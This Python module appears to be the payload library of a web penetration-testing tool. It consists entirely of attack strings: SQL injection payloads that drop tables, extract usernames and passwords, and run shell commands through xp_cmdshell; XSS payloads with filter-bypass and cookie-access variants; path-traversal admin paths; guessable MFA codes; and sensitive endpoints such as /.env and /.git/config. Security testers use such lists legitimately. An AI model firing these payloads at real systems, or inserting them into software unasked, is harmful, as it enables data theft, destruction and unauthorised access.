from typing import List

class Payloads:
    """Centralized payload management"""
    
    @staticmethod
    def get_sql_injection_payloads() -> List[str]:
        """Get SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "'; DROP TABLE users;--",
            "' UNION SELECT username, password FROM users--",
            "' AND 1=1--",
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('net user')--",
            "' UNION SELECT NULL, NULL--",
            "' AND SLEEP(5)--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1 limit 1 --",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--"
        ]
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Get XSS payloads for SECURITY TESTING only"""
        return [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            
            # Image-based XSS
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x:alert(1) onerror=eval(src)>",
            
            # SVG-based XSS
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            
            # Event handler XSS
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            
            # iFrame XSS
            "<iframe src=javascript:alert(1)>",
            "<iframe onload=alert(1)>",
            
            # Obfuscated XSS (for filter bypass testing)
            "';alert(String.fromCharCode(88,83,83))//",
            "<IMG SRC=# onmouseover=\"alert('xss')\">",
            
            # JavaScript protocol
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            
            # Data URI XSS
            "<img src=data:text/html,<script>alert(1)</script>>",
            
            # Polyglot XSS (works in multiple contexts)
            "';alert(1)//",
            "\";alert(1)//",
            
            # Case variation (bypass case-sensitive filters)
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=x OnErRoR=alert(1)>",
            
            # Encoded XSS
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            
            # Attribute-based XSS
            "\" onload=alert(1) x=\"",
            "' onload=alert(1) x='",
            
            # For testing only - shows vulnerability clearly
            "<script>console.log('XSS Vulnerability Found')</script>",
            "<img src=x onerror=console.log('XSS')>"
        ]
    
    @staticmethod
    def get_waf_bypass_payloads() -> List[str]:
        """Get WAF bypass payloads"""
        return [
            "admin_panel",
            "/admin",
            "../../admin",
            "/%2e%2e/admin",
            "/admin%00",
            "/admin.php",
            "/administrator",
            "/wp-admin",
            "/cpanel"
        ]
    
    @staticmethod
    def get_mfa_bypass_tokens() -> List[str]:
        """Get MFA bypass tokens to test"""
        return [
            "000000",
            "111111",
            "123456",
            "654321",
            "999999",
            "000001",
            "123123"
        ]
    
    @staticmethod
    def get_common_endpoints() -> List[str]:
        """Get common endpoints for enumeration"""
        return [
            "/admin", "/administrator", "/admin.php", "/admin/login", 
            "/login", "/signin", "/auth", "/dashboard", "/panel",
            "/api", "/api/v1", "/rest", "/graphql",
            "/config", "/debug", "/.env", "/phpinfo.php",
            "/robots.txt", "/sitemap.xml", "/.git/config"
        ]